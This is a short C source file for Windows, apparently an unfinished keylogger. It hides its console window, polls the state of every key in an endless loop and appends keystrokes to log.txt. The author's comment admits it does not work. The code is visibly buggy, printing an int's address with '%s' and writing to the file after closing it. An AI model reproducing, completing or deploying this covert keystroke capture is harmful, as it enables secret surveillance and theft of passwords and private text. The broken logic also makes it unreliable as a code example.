// Obviously doesn't work, yet, or maybe ever.

/*
    Debug Log so I don't go insane trying to make this work:
    SaveInt - Save key input states in a log file (broken)
    Save - Save key input in a log file (broken)
    Probable cause of everything being broken: Checking the wrong keycode.
    Cause: Checking for equality instead of setting an array element..
*/

#include <windows.h>
#include <stdio.h>

int Save(int _key, char *file);
int SaveInt(int number, char *file);

int main(void){
    int keyPressed = 0;
    int keyBind = 0x41;

    FreeConsole();
    while (1 == 1){
        Sleep(10);
        if ((GetAsyncKeyState(keyBind) & 0x8000) && !keyPressed){
            keyPressed = 1;
        }
        else if (!(GetAsyncKeyState(keyBind)) && keyPressed){
            keyPressed = 0;
            Save(keyBind, "log.txt");
        }
    }
    return 0;
}

int Save(int _key, char *file){
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "START\n");
    int activeKey = 1;
    int pressedChars[255+8];

    for(int iteration = 0; iteration < 255+8; iteration++){
        pressedChars[iteration] = 0;
    }

    while (activeKey == 1){
        Sleep(10);
        for (int i = 8; i < 255; i++){
            int keyState = GetAsyncKeyState(i);
            if ((keyState & 0x8000) && (i == 0x42)){
                fprintf(OUTPUT_FILE, "END\n");
                fclose(OUTPUT_FILE);
                break;
            }
            if (!(keyState) && (pressedChars[i] == 1)){
                fprintf(OUTPUT_FILE, "%s", &i);
                //fprintf(OUTPUT_FILE, "RELEASED:%s,%d\n", &i,i);
                pressedChars[i] = 0;
            }
            if ((keyState & 0x8000) && (pressedChars[i] == 0)){
                //fprintf(OUTPUT_FILE, "PRESSED:%s,%d\n", &i,i);
                pressedChars[i] = 1;
            }
        }
    }
    return 0;
}

int SaveInt(int number, char *file){
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    fprintf(OUTPUT_FILE, "%d,\n", number);
    fclose(OUTPUT_FILE);
    return 0;
}
